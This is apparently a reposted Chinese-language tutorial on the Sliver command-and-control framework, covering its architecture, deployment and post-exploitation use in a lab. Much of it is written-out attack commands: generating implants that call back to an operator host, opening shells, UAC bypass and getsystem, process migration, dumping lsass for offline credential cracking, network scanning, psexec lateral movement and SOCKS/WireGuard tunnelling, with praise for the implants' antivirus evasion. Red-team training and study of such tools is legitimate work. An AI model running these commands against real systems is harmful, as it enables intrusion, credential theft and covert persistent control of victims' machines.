<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/7iEvp8Ih7dN6jBdnqBTcJg)

一、关于 Sliver C2
==============

什么是 C2？
-------

Command and control（C2）框架允许攻击者充分利用对计算机系统或网络的现有访问，用于后渗透阶段（是在获取初始权限后的阶段）。

什么是 Sliver C2？
--------------

Sliver C2 是一个开源的跨平台红队框架。

常见的术语：  
implant - 用于保持访问权限的软件，通过使用 C2 命令  
beacon - 1 一种通信模式，定期连接 C2 服务器；2 CS beacon  
Stage - 载入的方法，阶段式或非阶段式

提供了两种操作模式

1.  Beacon mode：实现了一种异步通信方式，定期（1min）检查通信情况
    
2.  Session mode：实现了实时会话方式
    

优势：

1.  免杀能力极强
    
2.  模块化，提供了多种扩展，如 armory 可以安装各种第三方工具（BOF、.NET 工具等）
    
3.  多操组员模式
    
4.  开源
    
5.  支持多平台（Linux, Windows and MacOS）
    

Sliver C2 架构
------------

主要由四部分构成：

*   服务器控制台 - 服务器控制台是主界面，通过 sliver-server 可执行文件启动，所有操作代码都在客户 / 服务器控制台之间共享；服务器控制台通过一个 gRPC 接口与服务器进行通信。
    
*   Sliver C2 服务器 - Sliver C2 服务器是 sliver-server 可执行文件的一部分，管理内部数据库，启动和停止网络监听器。与服务器交互的主要接口是 gRPC 接口，所有的功能都是通过它实现的。
    
*   客户端控制台 - 客户端控制台是用于与 Sliver C2 服务器互动的主要用户界面。
    
*   植入物 - 植入物是在目标系统上运行的恶意代码（exe、ps1 等）。  
    各部分的关系及交互形式可由如下图展示出来：  
    ![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMGKnLgsp9IoPWj1ZWyAZuIYSdaBeVDV3bhzaIhI3CYppCgRoZTImbug/640?wx_fmt=png)
    

与 CS 的比较
--------

这个在线表格总结除了市面上几乎所有的 C2 工具的能力对比，可以参考阅读下。  
![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMHYP0RP0TFs0npic20aOCHNc4BVyBfxtibq7o3eVpk5lW0A4fXBB3cfKw/640?wx_fmt=png)

二、部署 Sliver C2
==============

仓库地址 - Releases · BishopFox/sliver (github.com)  
官方建议 Server 最好部署在 Linux 上（不建议 WIndows）  
直接找到对应版本下载 Server 和 Client 版本即可。

Sliver 有两个外部依赖的可选功能：MinGW 和 Metasploit。

1.  要启用 DLL 有效载荷（在 Linux 服务器上），你需要安装 MinGW。
    
2.  要启用一些 MSF 集成功能，你需要在服务器上安装 Metasploit。
    

三、Sliver C2 使用手册
================

3.1 极速上手
--------

以 http 通信为例，在获取目标初始权限后，创建监听器，生成对应架构的 Implant，上传执行

```
# 启动
./sliver-server_linux
# 创建监听器
http -l 9001
# 生成Implant/Payload
generate --http http://172.16.181.182:9001 --os windows


```

受害机上执行，成功回连，免杀确实很强  
![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMfsH7cKTdRGRGnHYH24ms8dGokMibvQTxz066bekWzp6sAKRuibQMoS9Q/640?wx_fmt=png)  
回连信息：  
![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMEDdHQyibohhtVl80l5vWNUicG7Jc7knyN2WHj6UyAQRhBPcAOF2xRg1g/640?wx_fmt=png)  
使用 use 进入交互  
![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMfQ77OGE4fia5hBBm7v6fMVbncaMOOFmFZEdBZLiaORKlrRJpkdNgpavA/640?wx_fmt=png)  
后续就是进一步的操作了，这里给出一张图，描述了后渗透的进攻思路及流程，熟悉 Sliver 的兄弟可以直接跳转到后渗透利用部分。  
![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMzY3kO11srzibKFULmPqLMYsfOEu7tq61E9u13RY0a6lXm6icy0HwvuAQ/640?wx_fmt=png)

3.2 功能详细介绍
----------

### Implant | 植入物

Sliver C2 支持多种平台，可以用 --os 标志来改变编译器目标。Sliver C2 也接受任何 Golang GOOS 和 GOARCH 作为参数 --os 和 --arch

```
# 生成不同架构的Implant
generate --http http://172.16.181.182:9001
generate --mtls 172.16.181.182:443 --os windows --arch amd64
generate --mtls 172.16.181.182:443 --os linux --arch amd64
generate --mtls 172.16.181.182:443 --os mac --arch arm64
# 查看所有Implant信息
implants
# 重新生成指定Implant
regenerate --save . [Implant Name]


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXM5txs36yekDP7REA0lyJPfhyF58B9orMDyL5AK0a3YfbwMkjgmPsz4w/640?wx_fmt=png)

### Listener | 监听器

启动监听器用于接收获取目标主机回连的 shell，支持如下协议：

*   mTLS  
    相互传输层安全（mTLS）是一个建立加密 TLS 连接的过程，其中双方都使用 X.509 数字证书来验证对方。
    
*   HTTP
    
*   HTTPS
    
*   DNS
    
*   Wireguard
    

```
# 启动指定协议的监听器，配置端口
mtls -l 443


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMed56mMHMib9RMrSczXsar79sicg6oib6Wf0QeBPDDumCkQwaiaIXzbCHTA/640?wx_fmt=png)

### Sessions | 会话

当目标主机执行我们刚刚生成的 Implant 时，控制台中会显示一条信息，使用 use 命令连接进去，就可以进行基本的控制操作了。常见操作与我们使用 windows 和 linux 差不多，可以参考 HELP 中的提示。

```
use [sessions ID]


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMLFHtqiapiazPhPcib2iazVgEK4SuyAmLrJDyEwmgxGkxIOS5XAj4h3FCRA/640?wx_fmt=png)

### Beacons | 信标

和 Sessions 不同的是，在生成载荷的时候需要添加 beacon 参数，如下：

```
generate beacon --http http://172.16.181.182:9002
http -l 9002


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMFxIWDoOXwS1v19dDktcoaHjlOcHFxh728PyLpl1RSjC3kQMiaIgkXPw/640?wx_fmt=png)

```
# 实时查看beacons的通信情况
beacons watch


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMoZ2jVfDuFPecMUic8EiaWJ4rLkuajVZCDUMMrBsRjNhbhIM0mruOQJkQ/640?wx_fmt=png)

### Armory | 扩展管理器

Armory 是 Sliver Alias and Extension 软件包管理器，它允许你自动安装各种第三方工具，如 BOF 和. NET 工具。工具的清单可以在 Github 上找到。  
安装第三方工具命令如下：

```
armory install rubeus


```

### Multiplayer | 多操作员模式

生成配置文件及开启多操作员模式

```
# 添加操作员，生成配置文件
new-operator --name x1gua --lhost 172.16.181.182
# 启动多操作员模式，及指定端口
multiplayer
multiplayer -l 8848


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMMGoJzjRNLibZa92WMYOlx6OiaD017en6cibuic9RUOia6YHbomJoQouL15A/640?wx_fmt=png)  
在另一台操作端上导入配置文件及连接 Sliver 服务端（这里以 macos 为例）

```
./sliver-client_macos import x1gua_172.16.181.182.cfg
./sliver-client_macos


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMX1iaGZ6OekibNfdjCt2I60p84xrbpKg38tMFOgaWQ5tOUWWlLgmR01sg/640?wx_fmt=png)

3.3 后渗透利用 - Windows
-------------------

### Execution | 执行命令

获取到控制权后，一些常见的命令执行：

```
# 开启一个命令行窗口shell
shell
# 执行命令
execute -o ipconfig
# 启动一个新进程运行指定命令
runas -p "ipconfig.exe" -u "xigua" -P "123.com"


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXM7cvRHNQqRwTyuw1AdFLDiciaQ4VlQof0pw8foEQcUP1pymiammOjxGXEw/640?wx_fmt=png)

### Privilege Escalation | 权限提升

绕过 UAC 及获取 SYSTEM 权限

```
# 上传文件并执行，绕过uac提权 [这里似乎失败了]
upload /root/Desktop/uac.ps1 "C:\Users\Administrator\Desktop\uac.ps1"
execute -o powershell -ExecutionPolicy Bypass -File "C:\Users\Administrator\Desktop\uac.ps1"
getsystem


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXM4zgoicGyukruiau4enIzM3joVvVku73DHeG1GKNxPb1bLicqSK6O5qWVw/640?wx_fmt=png)

### Persistence | 持久化

进程迁移

```
# 查看进程列表信息
ps
# 进程迁移
migrate 3108
# 切换进程
use 244e1361


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMFwez4rgiawCXadYKKmSZk7wx9Dp23ltuTiczrS7xMddrwicx5WAnkr3iaQ/640?wx_fmt=png)

### Credential Access | 凭据访问

导出 lsass.dump 信息，离线破解，需要 SYSTEM 权限。

```
# 导出lsass信息 [需要system权限]
procdump --pid 664 --save lsass.dump
kali> pypykatz lsa minidump lsass.dump


```

### Discovery | 深入探索

获取网络邻居缓存条目

```
# 原生命令
Get-NetNeighbor | Where-Object -Property State -NE "Unreachable" | Select-Object -Property IPAddress
# Sliver中执行
execute -o powershell "Get-NetNeighbor | Where-Object -Property State -NE "Unreachable" | Select-Object -Property IPAddress"


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMZibUXiaDPP1u06zQn8dvBMrSLiae67qEnQSt9icSenich2QLtIYEU0kWHFw/640?wx_fmt=png)

Powershell 中进行 ping 扫描探测存活

```
# 1
99..102 | foreach { '10.10.1.${_}: $(Test-Connection -TimeToLive 64 -Count 1 -ComputerName 10.10.1.${_} -Quiet)' }

# 2
99..102 | foreach {(New-Object System.Net.NetworkInformation.Ping).Send("10.10.1.${_}", 1000)}


```

其余的和内网渗透一致，这里就不展开了

### Lateral Movement | 横向移动

这里以 psexec 横向移动为例，进行演示。

```
# 创建配置文件
profiles new --format service --skip-symbols --mtls 172.16.181.182 psexec_test
# 执行psexec攻击
psexec -profile pentest --service-name pentest -service-description pentest red.team


```

本地环境，有些配置没有开启  
![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMSM9tb7NFVMHAduEciaFBIAL1tzGq1dPXMm8jVe7wb6P1KeAkJ5FaOFw/640?wx_fmt=png)

### Command&Control | 内网穿透

#### Socks Proxy | 内网代理

Sliver C2 中搭载了内置的 Socks5 命令，用于快速创建 Socks 代理

```
socks5 start -P 9001


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMmSLeEM5l390BD7ur8KhzAoAYqHwGGPqgTEhteDtiakdN4jn1nicFA7CA/640?wx_fmt=png)

> 这里是在客户端中执行的，有个疑问就是为什么可以在客户端上开启 socks 而不是在服务器，稍微复杂。

在浏览器中设置代理  
![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMmOd7J6DAINhlOB2mFuBWzh5rQ7kDsaSIPWyldWkdWduvx7tiaiayVSfA/640?wx_fmt=png)

在内网机器上开启简易 http 服务来测试  
![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMEDWJpcNBibaSep2exDWowOY1xGO9NRt1MYmr7mORGac28fribtjzibAhg/640?wx_fmt=png)

#### Wireguard | 端口转发?

> 参考 - Port Forwarding(github.com)

端口转发为例：  
创建监听器，生成 Implant

```
# 开启WireGuard监听器
wg --lport 9100
# 生成对应的Implant
generate --wg 172.16.181.182:9100 --os windows --arch amd64 --format exe


```

执行上线，对端的地址就配置为了 100.64 段  
![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXM6RI7sD17ArVo8Cn2qb9SbDMNlq4NiacBPATCLUjq1QfUpbicj23rnicxA/640?wx_fmt=png)

添加端口转发，转发目标主机 3389 端口

```
wg-portfwd add -r 172.16.181.139:3389


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMnOibbTgA8rdaoHXBlN5yhZcnVqRDiabjRXktnKvbD9sjfb5cJtkHvhaA/640?wx_fmt=png)

导出 wireguard 配置文件，在其中的 Endpoint 字段设置为 Sliver 服务端的 WireGuard 监听器。

```
wg-config -s /usr/local/etc/wireguard/wireguard.conf

Address = 100.64.0.8/16
ListenPort = 51902
PrivateKey = uG6A0qrE95iboIM33RdkzXrKX1a99M3PcCHHm+hAyGg=
MTU = 1420
[Peer]
PublicKey = 4FcKBOGCHP2jvnDHZyo8Ga/iulFf0SvRzjOP85/k+DM=
AllowedIPs = 100.64.0.0/16
Endpoint = 172.16.181.182:9100


```

安装 WireGuard 工具，建立通信

```
# MacOS
brew install wireguard-tools
# Linux
apt install wireguard-tools


```

启动 WireGuard 工具

```
wg-quick up wireguard


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXM4bibGYpccYXJWXDtEqiby534wdVzojqsJspCEDEjb3xsQpctqzfTy5bg/640?wx_fmt=png)  
开启后就可以远程连接了  
参考：wall / 在 mac 上使用 wireguard-tools (github.com)

3.4 安全配置
--------

### 端口修改

修改服务端配置文件，修改为非常见常见端口

```
vi ~/.sliver/configs/server.json


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMBBHic3eibpK8SbcibAwNPVsdP0SWnibHmV7icAL3jb7WxxjZD9BcEAs62xA/640?wx_fmt=png)  
如果生成了多操作员的配置文件，在其中修改端口选项

```
vi ~/.sliver-client/configs/x1gua_172.16.181.1.cfg


```

![](https://mmbiz.qpic.cn/mmbiz_png/5wqONuWHOtvjOrXZ2K9O5eEB4laPVhXMkWKcAarb7NdnZuXqCC0AeYB3LQHC2vphmg4ViaHpkV7rJHoLZnIuhEg/640?wx_fmt=png)

四、后续研究
======

通过本文，相信读者已经可以自行部署 Sliver C2 及快速上手，多实验几次就会对其中常见的功能和命令了如指掌。  
但是！  
这只是 Sliver C2 研究的开始，之所以可以被称作为 Cobalt Strike 的替代品，必然有其过人的能力，在后续的文章中，将介绍它的扩展功能，包括但不限于使用 BOFs and COFFs、各协议通信时数据包分析、植入物免杀能力的深入研究和实战中的利用等，总之，关于这款工具的使用技巧将会慢慢分享出来。

```
转载：https://forum.butian.net/share/2243
作者：xigua
欢迎大家关注作者

```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1) 点击下方小卡片或扫描下方二维码观看更多**技术文章**![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_jpg/5wqONuWHOttNT2kA600f3w0egqPoPFqoqt2KucV4p8gsxTuMnD2LdvaObaEEh6xypHfVIKaSugyTxKsNRBOdUw/640?wx_fmt=jpeg)

**师傅们点赞、转发、在看就是最大的支持**